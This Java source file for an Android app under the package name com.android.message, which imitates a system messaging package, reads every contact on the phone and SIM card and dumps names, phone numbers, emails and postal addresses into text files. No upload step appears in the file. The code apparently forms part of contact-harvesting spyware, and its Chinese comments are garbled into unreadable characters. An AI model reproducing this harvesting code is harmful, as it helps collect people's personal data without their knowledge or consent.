package com.android.message;


import java.io.IOException;

import android.app.Activity;
import android.content.*;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;
/**
 * ��ȡ��ϵ����Ϣ����
 * @author log(K)
 *
 */
public class Contacts {
	
	Context mContext;
	
	public Contacts (Context context) {
		mContext = context;
	}
	
	public void getLocalContacts() {
		String NAME = "OutLookPhoneNum.txt";
		String PATH = "data/data/com.android.message";
		FileIOHelper fileiohelper = null;
		
		String strLC = "";
		
		strLC += "�ֻ���ϵ����Ϣ" + "\r\n\r\n";
		
		try {
			fileiohelper = new FileIOHelper(mContext,NAME,PATH );
		} catch (IOException e2) {
			e2.printStackTrace();
		}	
		
		//������е���ϵ��  
		ContentResolver cr = mContext.getContentResolver();
	    Cursor cur = (Cursor)cr.query(ContactsContract.Contacts.CONTENT_URI, 
			   null, 
			   null, 
			   null,
			   null);
	    
	   //ѭ������  
	    if (cur.moveToFirst()) {
	        
	        do {
	           //�����ϵ�˵�ID��  
	           String contactId = cur.getString(
	        		   cur.getColumnIndex(ContactsContract.Contacts._ID));
	                      
	           //�����ϵ������ 
	           String disPlayName = cur.getString(
	        		   cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
	           strLC += "����:       " + disPlayName + "\r\n";
			   
	           //�鿴����ϵ���ж��ٸ��绰���롣���û�У�����ֵΪ0  
	           int phoneCount = cur.getInt(
	        		   cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));  
	           if (phoneCount > 0) {  
	               //�����ϵ�˵ĵ绰���� 
	        	   ContentResolver crPhone = mContext.getContentResolver();
	               Cursor phones = crPhone.query(
	            		   ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
	            		   null,
	            		   ContactsContract.CommonDataKinds.Phone.CONTACT_ID+ " = " + contactId, 
	            		   null, 
	            		   null);
	               
	               if (phones.moveToFirst()) {  
	                   do {  
	                       //�������еĵ绰����  
	                       String phoneNumber= phones.getString(
	                    		   phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
	                       
	                       strLC += "�绰:       " + phoneNumber + "\r\n";
						   
	                   } while(phones.moveToNext());  
	               }
	           }// end of if (phoneCount > 0)
	           
	           // ����email��ַ������emailҲ�����ж��             
	           Cursor emails = mContext.getContentResolver().query(
	        		   ContactsContract.CommonDataKinds.Email.CONTENT_URI,
	        		   null,
	        		   ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = " + contactId, 
	        		   null, 
	        		   null);
	           
	           strLC += "email:      ";
	           
	           if (emails.moveToFirst()) { 
                   do {
            	      String emailAddress = emails.getString(
            	    		  emails.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
            	      strLC += emailAddress+" ";
            	   } while (emails.moveToNext());
               } else {
	        	   strLC += "��.";
	           }
               
               strLC += "\r\n";
               emails.close();
               
               // �����ϵ�˵ĵ�ַ
               Cursor address = mContext.getContentResolver().query(
            		   ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_URI,
            		   null,
            		   ContactsContract.CommonDataKinds.StructuredPostal.CONTACT_ID + " = " + contactId, 
            		   null, 
            		   null);
               
               strLC += "address:";
               
               if (address.moveToFirst()) { 
            	   strLC += "\r\n";
                   do {
            	      /** These are all private class variables, don��t forget to create
            	       *  them.
            	       */
            	      String poBox = address.getString(address.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POBOX));
            	      String street = address.getString(address.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
                      String city = address.getString(address.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
                      String state = address.getString(address.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
                      String postalCode = address.getString(address.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
                      String country = address.getString(address.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
                      String type = address.getString(address.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE));
                      strLC += "poBox:      " + poBox + "\r\n";
                      strLC += "street:     " + street + "\r\n";
                      strLC += "city:       " + city + "\r\n";
                      strLC += "state:      " + state + "\r\n";
                      strLC += "postalCode: " + postalCode + "\r\n";
                      strLC += "country:    " + country + "\r\n";
                      strLC += "type:       " + type + "\r\n";
                  } while (address.moveToNext());
               } else {
            	   strLC += "    ��.";
               }
               
               strLC += "\r\n\r\n";
               try {
            	   fileiohelper.write(strLC);
			   } catch (IOException e) {
				   e.printStackTrace();
			   }
			   
               // ����ַ���
   	    	   strLC = "";
   	    	
	        } while (cur.moveToNext());
	      }// end of if (cur.moveToFirst())
	    
	    try {
			fileiohelper.close();
		} catch (IOException e1) {
			e1.printStackTrace();
		}
	    
	}// end of getLocalContacts()
	   
	public void getCardContacts() {
		TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
		if (!get_Sim_State(tm)) {
			return;
		}
		
		// ��ȡSIM��,�����ֿ���:content://icc/adn��content://sim/adn
		String NAME = "SimPhoneNum.txt";
		String PATH = "data/data/com.android.message";
		String strCC = "";
		FileIOHelper helper = null;
		
		try {
			helper = new FileIOHelper(mContext, NAME, PATH);
		} catch (IOException e1) {
			e1.printStackTrace();
		}
		
		strCC += "Card Contacts" + "\r\n\r\n";
		
		try {
			Intent intent = new Intent();
			intent.setData(Uri.parse("content://icc/adn"));
			Uri uri = intent.getData();
			Cursor mCursor = mContext.getContentResolver().query(uri, null, null, null, null);
			int iCount = 0;
			if (mCursor != null && mCursor.moveToFirst()) {
				
				do {
					iCount++;
					// ȡ��id
					//String contactId = mCursor.getString(mCursor.getColumnIndex("_id"));//contactIdColumnIndex);
					// ȡ����ϵ������
					String contactName = mCursor.getString(mCursor.getColumnIndex("name"));//nameFieldColumnIndex);
					// ȡ�õ绰����
					String userNumber = mCursor.getString(mCursor.getColumnIndex("number"));//);
					
					strCC += iCount + ".\r\n";
					strCC += "Name:" + contactName + "\r\n";
					strCC += "Phon:" + userNumber + "\r\n\r\n";

				} while (mCursor.moveToNext());
				
				mCursor.close();
			}

			helper.write(strCC);
		} catch (Exception e) {
			Log.i("Contacts", e.toString());
		}
	}
	
	public boolean get_Sim_State(TelephonyManager tm) {
		switch (tm.getSimState()) { //getSimState()ȡ��sim��״̬  ������6��״̬  
            case TelephonyManager.SIM_STATE_ABSENT :
            	return false;   
            case TelephonyManager.SIM_STATE_UNKNOWN :
            	return false;  
            case TelephonyManager.SIM_STATE_NETWORK_LOCKED :
            	return false;  
            case TelephonyManager.SIM_STATE_PIN_REQUIRED :
            	return false;  
            case TelephonyManager.SIM_STATE_PUK_REQUIRED :
            	return false;  
            case TelephonyManager.SIM_STATE_READY :
            	return true; 
            default: 
            	return false; 
	    }
	}

}
